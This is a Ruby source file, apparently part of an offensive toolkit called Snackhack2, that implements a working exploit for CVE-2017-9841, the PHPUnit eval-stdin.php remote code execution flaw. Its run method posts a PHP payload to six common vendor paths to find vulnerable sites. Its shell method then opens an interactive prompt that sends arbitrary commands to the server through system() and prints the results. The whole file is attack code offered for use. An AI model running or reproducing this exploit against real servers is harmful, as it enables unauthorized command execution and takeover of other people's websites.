# frozen_string_literal: true
require 'net/http'
require 'uri'
module Snackhack2
  class CVE20179841
    attr_accessor :ip

    def initialize(site, payload: "<?php echo md5('phpunit_rce'); ?>")
      @site = site
      @payload = payload
      @vulnerable = false
    end

    def run

      paths = ["yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"]
      paths.each do |path|
      
        uri = URI.parse(File.join(@site, path))
        request = Net::HTTP::Post.new(uri)
        request.body = "#{@payload}"

        req_options = {
          use_ssl: uri.scheme == "https",
        }
        response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
          http.request(request)
        end
        # this is the MD5 Hhash of "phpunit_rce"
        if response.body.match("6dd70f16549456495373a337e6708865")
            @vulnerable = true
            puts "THIS SITE IS vulnerable!"
            return path
        else
          puts "The site is not vulnerable.... #{File.join(@site, path)}"
        end

      end
    end
    def shell
      # if vulnerable it passes the path
      path = self.run
      # makes sure the site is vulnerable if it 
      # is it will run a endless while loop
      if @vulnerable
        while true
            # takes input to run on the server
          
            print(">")
            input = gets.chomp
            if input.eql?("exit")
              exit
            else
              uri = URI.parse(File.join(@site, path))
              request = Net::HTTP::Post.new(uri)
              # takes the input ad run it on the host
              request.body = "<?php system('#{input}'); ?>"

              req_options = {
                use_ssl: uri.scheme == "https",
              }

              response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
                http.request(request)
              end
              puts response.body
            end
        end
      end 
    end
  end
end
